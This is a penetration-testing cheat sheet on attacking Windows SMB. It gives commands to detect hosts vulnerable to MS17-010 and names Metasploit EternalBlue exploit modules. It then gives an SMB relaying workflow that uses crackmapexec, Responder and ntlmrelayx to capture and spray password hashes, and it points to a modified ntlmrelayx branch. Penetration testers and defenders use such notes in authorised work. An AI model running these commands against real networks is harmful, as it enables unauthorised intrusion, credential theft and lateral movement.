## SMB Vulns

### Detection

Grep host IP addresses with 445/tcp open and save to a file, 445.txt.

Run RunFinger.py in the Responder repository (make sure you use the script utility or tee to save the output):

`while read -r line;do ./RunFinger.py -i $line -g;done <445.txt`

Grep the RunFinger.py output for 'MS17-010: True'.

-OR-

Metasploit:

`use auxiliary/scanner/smb/smb_ms17_010`

### Exploit:
```
use auxiliary/admin/smb/ms17_010_command
use exploit/windows/smb/ms17_010_eternalblue
use exploit/windows/smb/ms17_010_eternalblue_win8
use exploit/windows/smb/ms17_010_psexec
```

## SMB Relaying

Run crackmapexec with the --gen-relay-list option to generate a file containing hosts that don't require SMB Signing.

Run Impacket ntlmrelayx with the -tf option specifying the file from the previous step.

`./ntlmrelayx [-t [target IP] | -tf [targetsfile] (from --gen-relay-list)] -l [LOOTDIR] -of [outputfile]`

Rerun Responder:

`./Responder.py -I <interface> -wrd`

Monitor ntlmrelayx output for any hashes that get dumped. If you get some, use crackmapexec to spray hashes across the network to discover systems that reuse the same local administrator account credentials.

No admin - SOL?

Modifications to ntlmrelayx

• Ropnop modified ntlmrelayx to not “waste” unprivileged SMB connections • Added two new options

• '--enum-local-admins'

• If the command execution fails, query local SAM for who has the right privileges

• --rid-cycle

• If the command execution fails, perform a RID cycle attack using LSAT to enumerate domain objects and save the result to a CSV • Ropnop's branch here:

• https://github.com/ropnop/impacket/tree/feature/enum_unprivdn

